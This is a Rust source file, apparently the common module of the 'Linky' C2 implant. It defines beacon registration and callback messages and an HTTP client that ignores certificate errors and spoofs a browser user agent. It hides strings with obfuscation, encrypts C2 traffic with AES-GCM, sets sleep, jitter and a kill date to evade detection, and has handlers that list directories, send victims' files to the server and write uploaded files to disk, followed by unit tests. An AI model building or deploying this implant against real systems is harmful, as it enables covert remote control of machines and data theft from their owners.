// Common types, state, and helpers for Linky implants

use obfstr::obfstr as s;
use std::sync::atomic::{AtomicI64, AtomicU32, AtomicU64, Ordering};

pub mod dispatch;

// ── Wire types ────────────────────────────────────────────────────────────────

/// Request sent during stage 2 (registration)
#[derive(serde::Serialize)]
pub struct RegisterRequest {
    pub link_username: String,
    pub link_hostname: String,
    pub internal_ip: String,
    pub external_ip: String,
    pub platform: String,
    pub pid: u32,
}

/// Request sent during stage 3 (callback)
#[derive(serde::Serialize)]
pub struct CallbackRequest<'a> {
    /// Hex-encoded encrypted payload (nonce || ciphertext)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub data: Option<&'a str>,
    /// Output of the previously executed task (empty on first poll)
    #[serde(default)]
    pub q: &'a str,
    /// ID of the completed task (empty if none)
    #[serde(default)]
    pub tasking: &'a str,
}

/// Response from the server containing a task
#[derive(serde::Deserialize)]
pub struct TaskResponse {
    /// Hex-encoded encrypted payload (nonce || ciphertext)
    #[serde(default)]
    pub data: Option<String>,
    /// Command to execute (empty when idle)
    #[serde(default)]
    pub q: String,
    /// Task ID to track (empty when idle)
    #[serde(default)]
    pub tasking: String,
    /// Rolling request ID; implant must echo this on the next call
    pub x_request_id: String,
    /// For file download tasks, contains base64 encoded file content
    #[serde(default)]
    pub file: Option<String>,
    /// For file download tasks, contains the original file name
    #[serde(default)]
    pub filename: Option<String>,
    /// For file upload tasks, contains base64 encoded file content to upload
    #[serde(default)]
    pub upload: Option<String>,
    /// For file upload tasks, contains the destination path
    #[serde(default)]
    pub upload_path: Option<String>,
}

// ── HTTP client ────────────────────────────────────────────────────────────────

/// Build a reqwest client with common configuration
pub fn build_client() -> reqwest::blocking::Client {
    reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .cookie_store(true)
        .user_agent(s!(
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        ))
        .build()
        .expect("reqwest client init failed")
}

// ── Encryption ────────────────────────────────────────────────────────────────

/// Derive a 32-byte key from secret and salt using SHA-256
pub fn derive_key(secret: &str, salt: &str) -> [u8; 32] {
    use sha2::{Digest, Sha256};
    use zeroize::Zeroize;

    let mut hasher = Sha256::new();
    hasher.update(secret.as_bytes());
    hasher.update(salt.as_bytes());

    let result = hasher.finalize();
    let mut key = [0u8; 32];
    key.copy_from_slice(&result[..32]);

    // Zeroize the intermediate hash result
    let mut result_bytes = result.as_slice().to_owned();
    result_bytes.zeroize();

    key
}

/// Encrypt configuration data using AES-256-GCM
pub fn encrypt_config(data: &str, key: &[u8; 32]) -> String {
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };
    use zeroize::Zeroize;

    let nonce_bytes = rand::random::<[u8; 12]>();
    let nonce = Nonce::from_slice(&nonce_bytes);
    let cipher = Aes256Gcm::new_from_slice(key).expect("Failed to create cipher");
    let ciphertext = cipher
        .encrypt(nonce, data.as_bytes())
        .expect("Encryption failure");

    let mut result = Vec::with_capacity(nonce.len() + ciphertext.len());
    result.extend_from_slice(nonce);
    result.extend_from_slice(&ciphertext);

    // Zeroize sensitive data
    let mut key_copy = *key;
    key_copy.zeroize();

    hex::encode(result)
}

/// Decrypt configuration data using AES-256-GCM
pub fn decrypt_config(encrypted_hex: &str, key: &[u8; 32]) -> Option<String> {
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };
    use zeroize::Zeroize;

    let encrypted_data = hex::decode(encrypted_hex).ok()?;
    if encrypted_data.len() < 12 {
        return None;
    }
    let nonce = Nonce::from_slice(&encrypted_data[..12]);
    let ciphertext = &encrypted_data[12..];
    let cipher = Aes256Gcm::new_from_slice(key).ok()?;

    // Zeroize sensitive data
    let mut key_copy = *key;
    key_copy.zeroize();

    match cipher.decrypt(nonce, ciphertext) {
        Ok(decrypted) => String::from_utf8(decrypted).ok(),
        Err(_) => None,
    }
}

/// Encrypt C2 payload data using AES-256-GCM
/// Returns hex-encoded (nonce || ciphertext)
pub fn encrypt_payload(data: &str, key: &[u8; 32]) -> String {
    encrypt_config(data, key)
}

/// Decrypt C2 payload data using AES-256-GCM
/// Expects hex-encoded (nonce || ciphertext)
pub fn decrypt_payload(encrypted_hex: &str, key: &[u8; 32]) -> Option<String> {
    decrypt_config(encrypted_hex, key)
}

// ── State (sleep / jitter / kill date) ────────────────────────────────────────

static SLEEP_SECONDS: AtomicU64 = AtomicU64::new(5);
static JITTER_PERCENT: AtomicU32 = AtomicU32::new(0);
/// `i64::MIN` is used as a sentinel meaning "no kill date set".
static KILL_DATE: AtomicI64 = AtomicI64::new(i64::MIN);

pub fn get_sleep_seconds() -> u64 {
    SLEEP_SECONDS.load(Ordering::Relaxed)
}

pub fn set_sleep_seconds(seconds: u64) {
    SLEEP_SECONDS.store(seconds, Ordering::Relaxed);
}

pub fn get_jitter_percent() -> u32 {
    JITTER_PERCENT.load(Ordering::Relaxed)
}

pub fn set_jitter_percent(percent: u32) {
    JITTER_PERCENT.store(percent.min(100), Ordering::Relaxed);
}

pub fn get_kill_date() -> Option<i64> {
    let v = KILL_DATE.load(Ordering::Relaxed);
    if v == i64::MIN {
        None
    } else {
        Some(v)
    }
}

pub fn set_kill_date(timestamp: Option<i64>) {
    KILL_DATE.store(timestamp.unwrap_or(i64::MIN), Ordering::Relaxed);
}

/// Returns true if the kill date is set and has passed.
pub fn should_exit() -> bool {
    if let Some(kill_date) = get_kill_date() {
        if let Ok(now) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
            if now.as_secs() as i64 > kill_date {
                return true;
            }
        }
    }
    false
}

// ── Timing ────────────────────────────────────────────────────────────────────

pub fn sleep(secs: u64) {
    std::thread::sleep(std::time::Duration::from_secs(secs));
}

pub fn sleep_with_jitter(base_seconds: u64, jitter_percent: u32) {
    if jitter_percent == 0 {
        sleep(base_seconds);
    } else {
        let jitter_range = (base_seconds as f64 * jitter_percent as f64 / 100.0) as i64;
        let jitter = (rand::random::<u64>() as i64 % (2 * jitter_range + 1)) - jitter_range;
        let sleep_time = if jitter.is_negative() {
            base_seconds.saturating_sub(jitter.unsigned_abs())
        } else {
            base_seconds.saturating_add(jitter as u64)
        };
        sleep(sleep_time.max(1));
    }
}

// ── Command helpers ───────────────────────────────────────────────────────────

/// Split `"cmd rest…"` → `("cmd", "rest…")`.
pub fn split_first(s: &str) -> (&str, &str) {
    s.find(' ')
        .map(|i| (&s[..i], s[i + 1..].trim_start()))
        .unwrap_or((s, ""))
}

/// List directory entries, appending `/` to subdirectories.
pub fn list_dir(path: &str) -> String {
    match std::fs::read_dir(path) {
        Ok(entries) => entries
            .flatten()
            .map(|e| {
                let name = e.file_name().to_string_lossy().into_owned();
                if e.file_type().map(|t| t.is_dir()).unwrap_or(false) {
                    format!("{}/", name)
                } else {
                    name
                }
            })
            .collect::<Vec<_>>()
            .join("\n"),
        Err(e) => format!("[-] {}", e),
    }
}

/// Read a file and return its content as `FILE:<path>:<base64>`.
pub fn download_file(path: &str) -> String {
    use base64::{engine::general_purpose::STANDARD, Engine as _};
    if path.is_empty() {
        return "[-] Usage: download <file_path>".to_string();
    }
    match std::fs::read(path) {
        Ok(buf) => format!("FILE:{}:{}", path, STANDARD.encode(&buf)),
        Err(e) => format!("[-] Failed to read file: {}", e),
    }
}

/// Decode base64 content and write to destination path.
/// `args` format: `<base64_content> <destination_path>`
pub fn upload_file(args: &str) -> String {
    use base64::{engine::general_purpose::STANDARD, Engine as _};
    if args.is_empty() {
        return "[-] Usage: upload <base64_content> <destination_path>".to_string();
    }
    let (content, path) = match args.find(' ') {
        Some(i) => (&args[..i], args[i + 1..].trim_start()),
        None => return "[-] Invalid upload command format".to_string(),
    };
    let decoded = match STANDARD.decode(content) {
        Ok(data) => data,
        Err(e) => return format!("[-] Failed to decode base64: {}", e),
    };
    match std::fs::write(path, &decoded) {
        Ok(()) => format!("[+] File uploaded successfully: {}", path),
        Err(e) => format!("[-] Failed to write file: {}", e),
    }
}

pub fn handle_sleep_command(args: &str) -> String {
    if args.is_empty() {
        return format!(
            "Current sleep: {} seconds, jitter: {}%",
            get_sleep_seconds(),
            get_jitter_percent()
        );
    }
    let parts: Vec<&str> = args.split_whitespace().collect();
    if !parts.is_empty() {
        if let Ok(new_sleep) = parts[0].parse::<u64>() {
            set_sleep_seconds(new_sleep);
            if parts.len() > 1 {
                if let Ok(new_jitter) = parts[1].parse::<u32>() {
                    set_jitter_percent(new_jitter);
                    return format!(
                        "[+] Sleep updated: {} seconds, jitter: {}%",
                        get_sleep_seconds(),
                        get_jitter_percent()
                    );
                }
            }
            return format!("[+] Sleep updated: {} seconds", get_sleep_seconds());
        }
    }
    "[-] Usage: sleep <seconds> [jitter_percent]".to_string()
}

pub fn handle_killdate_command(args: &str) -> String {
    if args.is_empty() {
        return match get_kill_date() {
            Some(ts) => match chrono::DateTime::<chrono::Utc>::from_timestamp_secs(ts) {
                Some(dt) => format!("Current kill date: {}", dt.format("%Y-%m-%d %H:%M:%S")),
                None => format!("Current kill date: {} (invalid timestamp)", ts),
            },
            None => "No kill date set".to_string(),
        };
    }

    if args.to_lowercase() == "clear" {
        set_kill_date(None);
        return "[+] Kill date cleared".to_string();
    }

    if let Ok(ts) = args.parse::<i64>() {
        set_kill_date(Some(ts));
        return match chrono::DateTime::<chrono::Utc>::from_timestamp_secs(ts) {
            Some(dt) => format!("[+] Kill date set to: {}", dt.format("%Y-%m-%d %H:%M:%S")),
            None => format!("[+] Kill date set to timestamp: {}", ts),
        };
    }

    let formats = [
        "%Y-%m-%d",
        "%Y-%m-%d %H:%M:%S",
        "%Y/%m/%d",
        "%Y/%m/%d %H:%M:%S",
    ];
    for fmt in formats {
        if let Ok(dt) = chrono::NaiveDateTime::parse_from_str(args, fmt) {
            let ts = dt.and_utc().timestamp();
            set_kill_date(Some(ts));
            return format!("[+] Kill date set to: {}", dt.format("%Y-%m-%d %H:%M:%S"));
        }
    }
    "[-] Usage: killdate [timestamp|YYYY-MM-DD|clear]".to_string()
}

// Re-export common types for convenience
pub use serde_json;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_split_first_with_space() {
        assert_eq!(split_first("sleep 30"), ("sleep", "30"));
    }

    #[test]
    fn test_split_first_no_space() {
        assert_eq!(split_first("whoami"), ("whoami", ""));
    }

    #[test]
    fn test_split_first_empty() {
        assert_eq!(split_first(""), ("", ""));
    }

    #[test]
    fn test_split_first_trims_args() {
        assert_eq!(split_first("cd   /tmp"), ("cd", "/tmp"));
    }

    #[test]
    fn test_encrypt_decrypt_roundtrip() {
        let key = derive_key("test-secret", "test-salt");
        let plaintext = "hello world";
        let encrypted = encrypt_config(plaintext, &key);
        let decrypted = decrypt_config(&encrypted, &key).unwrap();
        assert_eq!(decrypted, plaintext);
    }

    #[test]
    fn test_decrypt_invalid_hex_returns_none() {
        let key = derive_key("test-secret", "test-salt");
        assert!(decrypt_config("not-hex!", &key).is_none());
    }

    #[test]
    fn test_decrypt_too_short_returns_none() {
        let key = derive_key("test-secret", "test-salt");
        // 10 bytes < 12 (nonce size)
        assert!(decrypt_config("aabbccdd1122334455ff", &key).is_none());
    }

    #[test]
    fn test_sleep_with_jitter_no_panic() {
        // jitter=100 should not panic
        sleep_with_jitter(1, 100);
    }

    #[test]
    fn test_handle_sleep_command_parse() {
        let result = handle_sleep_command("10 20");
        assert!(result.contains("10 seconds"));
        assert!(result.contains("20%"));
    }

    #[test]
    fn test_handle_sleep_command_empty_shows_current() {
        let result = handle_sleep_command("");
        assert!(result.contains("seconds"));
        assert!(result.contains("jitter"));
    }

    #[test]
    fn test_handle_killdate_command_clear() {
        set_kill_date(Some(9999999999));
        let result = handle_killdate_command("clear");
        assert_eq!(result, "[+] Kill date cleared");
        assert!(get_kill_date().is_none());
    }

    #[test]
    fn test_handle_killdate_command_timestamp() {
        let result = handle_killdate_command("1893456000");
        assert!(result.contains("[+] Kill date set to"));
    }

    #[test]
    fn test_should_exit_no_killdate() {
        set_kill_date(None);
        assert!(!should_exit());
    }

    #[test]
    fn test_should_exit_past_killdate() {
        set_kill_date(Some(1)); // Unix epoch + 1s, definitely in the past
        assert!(should_exit());
        set_kill_date(None); // cleanup
    }
}
